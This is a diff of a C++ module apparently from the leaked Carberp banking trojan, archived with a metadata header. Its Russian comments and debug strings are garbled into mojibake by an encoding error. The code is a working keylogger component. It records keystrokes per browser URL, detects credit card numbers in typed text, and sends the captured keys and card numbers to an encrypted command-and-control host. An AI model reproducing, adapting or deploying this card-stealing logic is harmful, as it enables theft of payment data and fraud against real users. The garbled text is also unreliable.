@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
  #include "Modules.h"
 
@@ -24,11 +35,11 @@ namespace DBGCC
 
 #define CCDBG DBGCC::DBGOutMessage<>
 
-static char СС_HOSTS[CCHOSTS_PARAM_SIZE] = CCHOSTS_PARAM_NAME;
+static char пїЅпїЅ_HOSTS[CCHOSTS_PARAM_SIZE] = CCHOSTS_PARAM_NAME;
 
-//функция нахождения номера карточки, она определена в файле CreditCardNomber.cpp
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ CreditCardNomber.cpp
 int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd );
-//перевод непечатаемого символа в текстовое его описание, определена в файле UniversalKeyLogger.cpp
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ UniversalKeyLogger.cpp
 bool GetNonPrintCharText(DWORD Char, PCHAR &Buf);
 
 namespace CC
@@ -36,16 +47,16 @@ namespace CC
 
 struct UrlKeys
 {
-	char url[64]; //домен на котором набиты клавиши
-	char keys[256]; //коды введенных символов
-	int endPos; //позиция последнего введенного символа 
-	char numCard[24]; //номер найденной карты
-	int posCard; //позиция найденной карты в массиве keys (-1 - карта не найдена)
-	int posEndCard; //позиция последней цифры найденного номера карты
+	char url[64]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char keys[256]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	int endPos; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+	char numCard[24]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	int posCard; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ keys (-1 - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
+	int posEndCard; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 };
 
-UrlKeys* currData; //куда пишется поток клавиш
-PList listData; //список логгируемых урлов
+UrlKeys* currData; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+PList listData; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 static void FlushLog();
 
@@ -68,7 +79,7 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	TURLREC UR;
 	if( ParseURL( (char*)Data, &UR, false ) )
 	{
-		//ищем новый урл в списке
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		int count = List::Count(listData);
 		currData = 0;
 		for( int i = 0; i < count; i++ )
@@ -80,15 +91,15 @@ static void WINAPI URLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 				break;
 			}
 		}
-		if( currData == 0 ) //такого урла еще не было, добавляем
+		if( currData == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			currData = AddUrl(UR.Host);
 		ClearURL(&UR);
 	}
-	//если по какой-то причине урл не был найден или не был добавлен, то указываем по умолчанию неизвестный
+	//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if( currData == 0 )
 		currData = (UrlKeys*)List::GetItem( listData, 0 );
-	FlushLog(); //при смене урла отправляем все данные которые накопились
-	CCDBG( "CC", "логируем урл %s", currData->url );
+	FlushLog(); //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ %s", currData->url );
 }
 
 static char* CharToHex( unsigned char c, char* buf )
@@ -112,7 +123,7 @@ static char* GetAzUrl( char* url )
 #ifdef DEBUGCONFIG
 	m_lstrcpy( url, panelaz );
 #else
-	string host = GetActiveHostFromBuf2( СС_HOSTS, 0xF9203A43 /* __CC_HOSTS__ */, ССHOSTS_PARAM_ENCRYPTED );
+	string host = GetActiveHostFromBuf2( пїЅпїЅ_HOSTS, 0xF9203A43 /* __CC_HOSTS__ */, пїЅпїЅHOSTS_PARAM_ENCRYPTED );
 	if( !host.IsEmpty() )
 		m_lstrcpy( url, host.t_str() );
 	else
@@ -123,16 +134,16 @@ static char* GetAzUrl( char* url )
 
 static void SendLog( UrlKeys* uk )
 {
-	CCDBG( "CC", "Найдена карточка %s, позиция %d, урл: '%s'", uk->numCard, uk->posCard, uk->url );
+	CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d, пїЅпїЅпїЅ: '%s'", uk->numCard, uk->posCard, uk->url );
 	char* log = (char*)MemAlloc( sizeof(uk->keys) * 5 + 128 );
 	fwsprintfA pwsprintf = Get_wsprintfA();
 	//pwsprintf( log, "Url: %s\nFinded card: %s\nLogged keys: ", uk->url, uk->numCard );
 
-	int delim = 0; //вставка квадратных скобок для выделения номера карты
+	int delim = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i <= uk->endPos; i++ )
 	{
 		unsigned char c = uk->keys[i];
-		//выделяем номер карты в нужных позициях
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( i == currData->posCard && delim == 0 )
 		{
 			c = '[';
@@ -185,7 +196,7 @@ static void SendLog( UrlKeys* uk )
 	{
 		GenerateUid(uid);
 		pwsprintf( postUrl, "%s/cat/?mode=save&subsys=keylog", azUrl );
-		CCDBG( "CC", "отправляем лог в %s", postUrl );
+		CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ %s", postUrl );
 		PStrings fields = Strings::Create();
 		AddURLParam( fields, "id", (char*)uid );
 		AddURLParam( fields, "log", log, lenLog );
@@ -201,25 +212,25 @@ static void SendLog( UrlKeys* uk )
 	HCAB cab = CreateCab(cabFile);
 	AddBlobToCab( cab, mem, len, "LogFile.txt" );
 	CloseCab(cab);
-//	CCDBG( "CC", "CAB сохранен в файле %s", cabFile );
+//	CCDBG( "CC", "CAB пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ %s", cabFile );
 //	DataGrabber::SendCabDelayed( 0, cabFile, "CC" );
 	pDeleteFileA(cabFile);
 */
 	MemFree(log);
-	//очищаем буфер
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	uk->endPos = -1;
 	uk->posCard = -1;
 }
 
-//отправляет все что в логе, если есть номера карточек
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void FlushLog()
 {
 	int count = List::Count(listData);
-	CCDBG( "CC", "урлов %d", count );
+	CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅ %d", count );
 	for( int i = 0; i < count; i++ )
 	{
 		UrlKeys* uk = (UrlKeys*)List::GetItem( listData, i );
-		CCDBG( "CC", "урл %s, %d", uk->url, uk->posCard );
+		CCDBG( "CC", "пїЅпїЅпїЅ %s, %d", uk->url, uk->posCard );
 		if( uk->posCard >= 0 )
 			SendLog(uk);
 	}
@@ -232,28 +243,28 @@ static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 	{
 		CCDBG( "CC", "Key: %c (%02x)", *keys, (int)(unsigned char)*keys );
 		currData->endPos++;
-		if( currData->endPos >= sizeof(currData->keys) ) //буфер заполнен, сдвигаем его, удаляя 1-й символ
+		if( currData->endPos >= sizeof(currData->keys) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ 1-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			m_memcpy( currData->keys, currData->keys + 1, sizeof(currData->keys) );
 			currData->endPos--;
-			if( currData->posCard >= 0 ) currData->posCard--; //позиция карточки тоже сместилась
+			if( currData->posCard >= 0 ) currData->posCard--; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		}
 		currData->keys[currData->endPos] = *keys;
 		
-		if( currData->posCard >= 0 ) //карточка найдена
+		if( currData->posCard >= 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			//если после номера карточки ввели более 100 символов, посылаем лог в админку
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 100 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if( currData->endPos - currData->posCard >= 100 )
 				SendLog(currData);
 		}
-		else //карточка еще не найдена
+		else //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			if( currData->endPos > 20 ) //начинаем определять карточку только после ввода 20 символов
+			if( currData->endPos > 20 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 20 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				currData->posCard = FindCreditCard( currData->keys, currData->endPos + 1, 0, currData->numCard, currData->posEndCard );
 				if( currData->posCard >= 0 )
 				{
-					CCDBG( "CC", "определили карту %s", currData->numCard );
+					CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", currData->numCard );
 				}
 			}
 		}
@@ -265,7 +276,7 @@ static void WINAPI PushedKey(PKeyLogger Logger, DWORD EventID, LPVOID Data)
 
 static void OnClose(LPVOID Sender)
 {
-	FlushLog(); //отправляем все данные которые накопились
+	FlushLog(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 }
 
 bool Init(DWORD hashApp)
@@ -277,13 +288,13 @@ bool Init(DWORD hashApp)
 		S->OnProcessClose = OnClose;
 		PKlgWndFilter F = KeyLogger::AddFilter(S, false, false, "*", "*", FILTRATE_ALL_WND, LOG_KEYBOARD, 5);
 		listData = List::Create();
-		//добавляем элемент где будут логгироваться клавиши когда урл неизвестен
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		currData = AddUrl("Unknow url");
 		if( currData )
 		{
 			KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, URLChanged);
 			KeyLogger::ConnectEventHandler(KLE_ADD_TEXT_LOG, PushedKey);
-			CCDBG( "CC", "Система СС запущена" );
+			CCDBG( "CC", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 			return true;
 		}
 	}
